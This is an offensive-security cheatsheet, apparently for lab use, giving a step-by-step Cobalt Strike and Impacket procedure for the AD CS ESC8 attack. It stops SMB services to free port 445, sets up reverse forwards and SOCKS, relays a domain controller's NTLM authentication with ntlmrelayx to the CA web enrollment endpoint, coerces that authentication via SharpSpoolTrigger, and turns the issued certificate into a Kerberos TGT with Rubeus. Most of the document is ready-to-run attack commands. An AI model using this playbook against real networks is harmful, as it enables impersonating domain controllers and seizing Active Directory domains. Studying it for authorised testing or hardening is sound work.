---
title: "AD CS ESC8 \u00b7 NTLM Relay to Web Enrollment"
description: "Trace the lab SMB-to-HTTP relay through Cobalt Strike tunnels, obtain a computer certificate, authenticate with PKINIT and restore services and forwarding."
category: "AD CS"
tools: ["Cobalt Strike", "Certify", "Impacket", "ProxyChains", "Rubeus", "Kerbeus BOF", "SharpSpoolTrigger"]
updated: "2026-11-16"
tags: ["adcs", "esc8"]
draft: false
---

## 1. Why the attack works

ESC8 relays NTLM authentication to an AD CS HTTP enrollment endpoint and requests a certificate as the relayed principal. The endpoint must accept the relayed authentication and the selected template must be available to that identity.

HTTPS alone is not sufficient protection when Extended Protection/channel binding is not enforced. Relay success also depends on NTLM being available and on the source actually authenticating to the relay listener.

| Lab component | Role |
|---|---|
| `10.10.120.1` | DC whose authentication is triggered |
| `10.10.121.108:445` | Controlled Windows host receiving SMB |
| Operator host `7445` → container `445` | Published relay listener |
| SOCKS `10.0.0.5:1080` | Route from the container to the CA |
| `10.10.120.5/certsrv/` | CA web enrollment endpoint |

## 2. Enumerate and prepare the listener

```shell
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
# Confirm the actual web endpoint and enrollment permissions.
beacon> netstat
```

The lab frees TCP 445 by stopping SMB services. This interrupts shares and SMB-based Beacons: use a control channel that survives the change and record the original service settings. The restoration below assumes the lab's original automatic LanmanServer and running dependencies.

```shell
beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
beacon> sc_stop lanmanserver
beacon> sc_stop srv2
beacon> sc_stop srvnet
beacon> netstat
# Confirm TCP 445 is free before binding the forward.
beacon> rportfwd_local 445 localhost 7445
beacon> socks 1080 socks5
```

Confirm the container publishes host TCP 7445 to its TCP 445 listener and ProxyChains uses the team server's SOCKS endpoint. `rportfwd_local` terminates through the Cobalt Strike client; it is not interchangeable with a team-server forward.

## 3. Start relay and trigger authentication

```powershell
# Operator desktop; the lab container must already have its port mapping configured.
docker container start -i kali-1
```

```shell
# In the container; ProxyChains points to 10.0.0.5:1080.
proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

```shell
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
# Required result: successful enrollment as CONTOSO\LON-DC-1$ and a saved PFX.
```

The Spooler trigger requires its service and RPC path to be available. Do not treat a failed trigger as evidence that the CA endpoint is protected. The resulting certificate is for the **DC computer**, not Administrator.

## 4. Transfer the certificate output

The PFX is written in the relay container's working directory. Transfer that actual file to the operator's Windows machine before encoding it; it is not automatically present in Beacon's working directory.

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Attacker\Desktop\LON-DC-1.pfx'))
```

## Authenticate with the certificate

```shell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:LON-DC-1$ /domain:CONTOSO.COM /certificate:<CERTIFICATE_PFX_BASE64> /enctype:aes256 /nowrap
# Retain the returned TGT; this command does not import it.
```

The PFX must contain the private key. Verify certificate trust, validity, authentication usage, revocation availability and account mapping. An issued PFX does not prove that the KDC will accept it as the requested identity.

## Import and verify the TGT

```shell
# Rubeus Alternative
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:LON-DC-1$ /password:FakePass /ticket:<TGT_BASE64>
beacon> steal_token <CREATED_PID>
beacon> run klist
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-dc-1-computer.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
```

```shell
# OPSEC Alternative
beacon> make_token CONTOSO\LON-DC-1$ FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\lon-dc-1-computer.kirbi
beacon> run klist
```

Confirm the ticket client is `LON-DC-1$` and its service is `krbtgt/CONTOSO.COM`. Select one import path. The machine identity is not Administrator; continue with the [same-computer S4U2self workflow](/cheatsheets/kerberos-s4u2self-computer-takeover-cheatsheet/) only where its prerequisites hold.

## Session cleanup

```shell
beacon> krb_purge
beacon> rev2self
# Rubeus createnetonly path only:
beacon> kill <CREATED_PID>
```

Purging a ticket cache does not revoke the certificate. Record the issued request IDs and certificate serials for revocation through the CA when required.

## Restore relay infrastructure

Stop ntlmrelayx in its terminal. Remove the lab forwards and restore the original service configuration and running state.

```shell
beacon> socks stop
beacon> rportfwd stop 445
beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
beacon> sc_start srvnet
beacon> sc_start srv2
beacon> sc_start lanmanserver
beacon> netstat
```

Remove only firewall rules created for this exercise; do not delete an existing file-sharing rule. Verify that the forward is gone and normal SMB behavior has returned.

## Troubleshooting

| Symptom | Check |
|---|---|
| Callback arrives but no certificate is issued | NTLM relay protections, template rights, ProxyChains routing and CA endpoint |
| PKINIT fails | PFX includes its private key, PFX password if set, DC certificate/PKINIT support, clock and account mapping |
| Ticket imports but access is denied | Actual client identity, selected session, SPN and resource permissions |

## Quick checklist

```text
[ ] Confirm NTLM enrollment, relay protections and the target identity's template rights.
[ ] Record SMB service settings and preserve a working non-SMB control channel.
[ ] Verify container port mapping, reverse forwarding, SOCKS and CA reachability.
[ ] Start ntlmrelayx with the appropriate template.
[ ] Trigger authentication and confirm successful issuance, not merely a callback.
[ ] Transfer the actual computer PFX and preserve any PFX password.

AUTHENTICATE AND VERIFY
[ ] Obtain the final PFX with its private key; verify the intended identity.
[ ] Rubeus asktgt /certificate:<PFX_BASE64> -> retain the returned TGT.
# Rubeus Alternative
[ ] createnetonly /ticket:<TGT_BASE64> -> record PID, then steal_token <CREATED_PID>.
# OPSEC Alternative
[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-dc-1-computer.kirbi", [Convert]::FromBase64String("<TGT_BASE64>"))
[ ] make_token CONTOSO\LON-DC-1$ FakePass
[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\lon-dc-1-computer.kirbi
[ ] run klist -> verify client, realm, service and expiration.
[ ] Test actual resource authorization for this identity.

CLEANUP
[ ] Purge only the disposable session, then rev2self.
[ ] Kill only the process created by the Rubeus alternative.
[ ] Remove exported private-key material when no longer needed; handle certificate revocation separately.
[ ] Stop ntlmrelayx, SOCKS and the reverse forward.
[ ] Restore original SMB service settings/state and remove only temporary firewall rules.
```

## Related references

- [S4U2self computer takeover](/cheatsheets/kerberos-s4u2self-computer-takeover-cheatsheet/)
- [AD CS enumeration](/cheatsheets/adcs-enumeration-cheatsheet/)
- [Certify](https://github.com/GhostPack/Certify)
- [Rubeus](https://github.com/GhostPack/Rubeus)
